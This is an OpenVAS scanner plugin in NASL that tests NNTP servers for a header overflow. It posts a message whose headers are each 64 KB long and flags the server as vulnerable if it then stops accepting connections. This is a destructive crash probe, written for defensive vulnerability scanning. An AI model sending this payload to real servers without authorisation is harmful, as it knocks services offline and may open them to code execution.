# OpenVAS Vulnerability Test
# $Id: nntp_too_long_headers.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: NNTP message headers overflow
#
# Authors:
# Michel Arboi <mikhail@nessus.org>
#
# Copyright:
# Copyright (C) 2005 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "OpenVAS was able to crash the remote NNTP server by sending
a message with long headers. 
This flaw is probably a buffer overflow and might be exploitable
to run arbitrary code on this machine.";

tag_solution = "apply the latest patches from your vendor or
	 use a safer software.";

# Overflow on the user name is tested by cassandra_nntp_dos.nasl
# 
# NNTP protocol is defined by RFC 977
# NNTP message format is defined by RFC 1036 (obsoletes 850); see also RFC 822.

if(description)
{
 script_id(17228);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 name = "NNTP message headers overflow";
 
 script_name(name);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_copyright("This script is Copyright (C) 2005 Michel Arboi");

 family = "Gain a shell remotely";
 script_family(family);
 script_dependencies("find_service_3digits.nasl", "nntp_info.nasl");
 script_require_ports("Services/nntp", 119);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
include('global_settings.inc');
include('nntp_func.inc');

# This script might kill other servers if the message is propagated
if (safe_checks())
  exit(0);

port = get_kb_item("Services/nntp");
if(!port) port = 119;
if(! get_port_state(port)) exit(0);

user = get_kb_item("nntp/login");
pass = get_kb_item("nntp/password");

ready = get_kb_item("nntp/"+port+"/ready");
if (! ready) exit(0);

noauth = get_kb_item("nntp/"+port+"/noauth");
posting = get_kb_item("nntp/"+port+"/posting");

if (! noauth && (! user || ! pass)) exit(0);
if (! posting) exit(0);

s = nntp_connect(port: port, username: user, password: pass);
if(! s) exit(0);

len = 65536;

msg = strcat('Newsgroups: ', crap(len), '\r\n',
	'Subject: ', crap(len), '\r\n',
	'From: OpenVAS <', crap(len), '@example.com>\r\n',
	'Message-ID: <', crap(len), '@', crap(len), rand(), '.OPENVAS>\r\n',
	'Lines: ', crap(data: '1234', length: len), '\r\n',
	'Distribution: local\r\n',	# To limit risks
	'\r\n',
	'Test message (post). Please ignore.\r\n',
	'.\r\n');

nntp_post(socket: s, message: msg);
close(s);
sleep(1);

s = open_sock_tcp(port);
if(! s) 
{
  security_message(port);
  exit(0);
}
else
 close(s);

